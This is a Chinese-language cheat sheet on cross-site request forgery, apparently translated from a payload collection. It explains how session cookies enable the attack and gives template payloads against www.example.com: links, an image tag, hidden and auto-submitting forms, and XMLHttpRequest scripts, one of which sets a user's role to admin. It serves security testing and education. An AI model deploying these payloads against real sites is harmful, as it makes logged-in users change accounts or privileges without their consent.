# 跨站请求伪造

> 跨站请求伪造 (CSRF/XSRF) 是一种攻击可以使最终用户在当前已经通过身份验证的Web应用程序上执行不需要的操作. CSRF 攻击主要是针对更改状态的请求而不是去窃取数据, 攻击者无法看到攻击后的响应. - OWASP


## Summary

* [Methodology](#methodology)
* [Payloads](#payloads)
	* [HTML GET - Requiring User Interaction](#)
	* [HTML GET - No User Interaction)](#)
	* [HTML POST - Requiring User Interaction](#)
	* [HTML POST - AutoSubmit - No User Interaction](#)
	* [JSON GET - Simple Request](#)
	* [JSON POST - Simple Request](#)
	* [JSON POST - Complex Request](#)

## Tools

* [XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.](https://github.com/0xInfection/XSRFProbe)

## Methodology

![CSRF_cheatsheet](./images/CSRF-CheatSheet.png)

## Payloads

当你登陆到某个站点时，通常会有一个会话。该会话的标识符存储在浏览器的cookie里面，并且随每个请求一起发送到该站点。 即使其他站点触发了请求，该cookie也会与该请求一起发送，并且该请求的处理方式就像已登录的用户执行了该请求一样。

### HTML GET - Requiring User Interaction

GET请求需要用户交互

```html
<a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
```

### HTML GET - No User Interaction

GET请求不需要用户交互

```html
<img src="http://www.example.com/api/setusername?username=CSRFd">
```

### HTML POST - Requiring User Interaction

POST请求需要用户交互

```html
<form action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
```

### HTML POST - AutoSubmit - No User Interaction

POST请求 - 自动提交 - 不需要用户交互

```html
<form id="autosubmit" action="http://www.example.com/api/setusername" enctype="text/plain" method="POST">
 <input name="username" type="hidden" value="CSRFd" />
 <input type="submit" value="Submit Request" />
</form>
 
<script>
 document.getElementById("autosubmit").submit();
</script>
```

### JSON GET - Simple Request

JSON GET请求 简单的请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://www.example.com/api/currentuser");
xhr.send();
</script>
```

### JSON POST - Simple Request

JSON POST请求 简单的请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
//application/json is not allowed in a simple request. text/plain is the default
xhr.setRequestHeader("Content-Type", "text/plain");
//You will probably want to also try one or both of these
//xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
//xhr.setRequestHeader("Content-Type", "multipart/form-data");
xhr.send('{"role":admin}');
</script>
```

### JSON POST - Complex Request

JSON GET请求 复杂的请求

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "http://www.example.com/api/setrole");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
xhr.send('{"role":admin}');
</script>
```


## References

- [Cross-Site Request Forgery Cheat Sheet - Alex Lauerman - April 3rd, 2016](https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/)
- [Cross-Site Request Forgery (CSRF) - OWASP](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF))
- [Messenger.com CSRF that show you the steps when you check for CSRF - Jack Whitton](https://whitton.io/articles/messenger-site-wide-csrf/) 
- [Paypal bug bounty: Updating the Paypal.me profile picture without consent (CSRF attack) - Florian Courtial](https://hethical.io/paypal-bug-bounty-updating-the-paypal-me-profile-picture-without-consent-csrf-attack/)
- [Hacking PayPal Accounts with one click (Patched) - Yasser Ali](http://yasserali.com/hacking-paypal-accounts-with-one-click/)
- [Add tweet to collection CSRF - vijay kumar](https://hackerone.com/reports/100820)
- [Facebookmarketingdevelopers.com: Proxies, CSRF Quandry and API Fun - phwd](http://philippeharewood.com/facebookmarketingdevelopers-com-proxies-csrf-quandry-and-api-fun/)
- [How i Hacked your Beats account ? Apple Bug Bounty - @aaditya_purani](https://aadityapurani.com/2016/07/20/how-i-hacked-your-beats-account-apple-bug-bounty/)
- [FORM POST JSON: JSON CSRF on POST Heartbeats API - Dr.Jones](https://hackerone.com/reports/245346)
- [Hacking Facebook accounts using CSRF in Oculus-Facebook integration](https://www.josipfranjkovic.com/blog/hacking-facebook-oculus-integration-csrf)
- [Cross site request forgery (CSRF) - Sjoerd Langkemper - Jan 9, 2019](http://www.sjoerdlangkemper.nl/2019/01/09/csrf/)
- [Cross-Site Request Forgery Attack - PwnFunction](https://www.youtube.com/watch?v=eWEgUcHPle0)
- [Wiping Out CSRF - Joe Rozner - Oct 17, 2017](#https://medium.com/@jrozner/wiping-out-csrf-ded97ae7e83f)